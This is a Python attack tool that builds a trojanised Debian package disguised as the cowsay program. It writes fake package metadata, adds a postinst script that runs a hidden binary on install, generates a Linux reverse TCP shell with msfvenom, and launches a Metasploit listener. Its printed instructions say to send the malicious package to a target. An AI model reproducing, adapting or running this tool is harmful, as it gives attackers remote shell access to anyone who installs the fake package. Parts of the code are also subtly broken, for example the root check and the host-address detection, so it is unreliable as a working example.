######################################
##  Programmer: Myriad74            ##
##                                  ##
##  email: myriad74@protonmail.com  ##
######################################

import sys
import signal
import os

if sys.platform.startswith('linux'):
    if os.system("echo $EUID") == 0:
        print("[+] Access granted")
    else:
        print("[-] You must be root to run this program")
        quit()
else:
    print("[-] Operating system must be Linux to run this")
    
def shutdown(signal, frame):
    print("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Exiting...\033[0m\n")
    cowsay = os.path.abspath("cowsay") # get absolute path of current working folder
    os.system(f"rm -rf {cowsay} > /dev/null 2>&1") # remove the folder
    sys.exit() # exit using system call

signal.signal(signal.SIGINT, shutdown) # function call for custom
# handlers to be called and executed when signal received, signal.SIGINT represents a KeyboardInterrupt
# process an the frame is the shutdown function

def cowsay_installation():
    # Installing cowsay (download only)
    print("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Installing cowsay...\033[0m\n")
    os.system("apt --download-only install cowsay > /dev/null 2>&1") 
    # Extracting package to a new directory called cowsay
    os.system("cd ~/home > /dev/null 2>&1")
    print("[+] Will install in the home directory of whatever user is currently being used")
    os.system(f"dpkg -x /var/cache/apt/archives/cowsay_3.03+dfsg2-8_all.deb ~/cowsay > /dev/null 2>&1")

def build_package(program_path, payload_name):
    os.system(f"mkdir {program_path} > /dev/null 2>&1")
    os.system(f"mkdir {program_path}/usr/games > /dev/null 2>&1")
    os.system(f"touch {program_path}/usr/games/{payload_name} > /dev/null 2>&1")
    os.system(f"mkdir {program_path}/DEBIAN && cd {program_path}/DEBIAN > /dev/null 2>&1")
    os.system(f"touch {program_path}/DEBIAN/control > /dev/null 2>&1")

    with open(f"{program_path}/DEBIAN/control", "w") as control:
        control.write("Package: cowsay\n")
        control.write("Version: 3.03+dfsg2-4\n")
        control.write("Architecture: all\n")
        control.write("Maintainer: Francois Marier <francois@debian.org>\n")
        control.write("Installed-Size: 90\n")
        control.write("Depends: perl\n")
        control.write("Suggests: filters\n")
        control.write("Section: games\n")
        control.write("Priority: optional\n")
        control.write("Homepage: http://www.nog-net/~tony/warez\n")
        control.write("""Description: configurable talking cow
 Cowsay (or cowthink) will turn text into happy ASCII cows, with
 speech (or thought) balloons. If you don't like cows, ASCII art is 
 available to replace it with some other creatures (Tux, the BSD
 daemon, dragons, and a plethora of animals, from a turkey to
 an elephant in a snake).\n""")

    os.system(f"touch {program_path}/DEBIAN/postinst > /dev/null 2>&1")

    with open(f"{program_path}/DEBIAN/postinst", "w") as postinst:
        postinst.write(f"chmod 2755 /usr/games/{payload_name} && usr/games/{payload_name} & /usr/games/cowsay\n")
    
def listener(LHOST):
    print("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Listener\033[0m\n")

    start_listener = input("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Start Listener?\033[0m\n").lower()
    if start_listener in ["y", "yes"]:
        os.system(f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell/reverse_tcp; set LHOST {LHOST}; run'")
    else:
        sys.exit()

def banner():
    print("\n")
    print( " \033[1;31m   _________                            __ __________                __                           \033[0m")
    print( " \033[1;33m  /   _____/ ____   ___________   _____/  |\______   \_____    ____ |  | _______     ____   ____  \033[0m")
    print( " \033[1;31m  \_____  \_/ __ \_/ ___\_  __ \_/ __ \   __\     ___/\__  \ _/ ___\|  |/ /\__  \   / ___\_/ __ \ \033[0m")
    print( " \033[1;33m  /        \  ___/\  \___|  | \/\  ___/|  | |    |     / __ \\  \___|    <  / __ \_/ /_/  >  ___/ \033[0m")
    print( " \033[1;31m /_______  /\___  >\___  >__|    \___  >__| |____|    (____  /\___  >__|_ \(____  /\___  / \___  >\033[0m")
    print( " \033[1;33m         \/     \/     \/            \/                    \/     \/     \/     \//_____/      \/ \033[0m")

def generate_payload(LHOST, program_path, payload_name):
    start_payload = input("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Start payload?: \033[0m\n").lower()
    
    if start_payload in ["y", "yes"]:
        payload_path = f"{program_path}/usr/games/{payload_name}"
        print("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Starting...\033[0m\n")
        os.system(f"msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST={LHOST} -f elf -o {payload_path} > /dev/null 2>&1")
    else:
        sys.exit()
    
    os.system(f"chmod +x {program_path}/DEBIAN/postinst > /dev/null 2>&1")
    os.system(f"dpkg-deb --build {program_path}")
    print("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Payload built, in form of [payload].deb package...\033[0m\n")
    print("\n\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Send the malicious payload to target...\033[0m\n")

def main():
    try:
        if os.path.isfile('/usr/bin/msfconsole') or os.path.isfile('/snap/bin/msfconsole'):
            print("TRUE")
            payload_default = "cowsay_trojan"
            program_path = "/root/cowsay" # hard coded into root for extra security
            payload = input(f"[+] Choose payload name: (Default) {payload_default}: ")
            exists = os.path.isfile(payload)

            if payload == "":
                payload = f"{payload_default}"
            elif not exists:
                print("[-] Payload does not exist")

            LHOST = input("Please enter your host address\n\tIf you do not know it then leave blank to automatically work it out for you:")

            if LHOST == "":
                command = "hostname -i | awk '{print $2}'"
                LHOST = os.system(f"echo $({command}) > lhost.txt")
            
            with open("lhost.txt", "r") as file:
                LHOST = file.read().strip("\n")
            os.system("rm lhost.txt")
            print(LHOST)

            banner()
            cowsay_installation()
            build_package(program_path, payload)
            generate_payload(LHOST, program_path, payload)
            listener(LHOST)
        else:
            print("[-] You do not have msfconsole installed, please run the install.sh script first.")
            sys.exit()
    except:
        print("[-] Error")
        sys.exit()

if __name__ == '__main__':
    main()
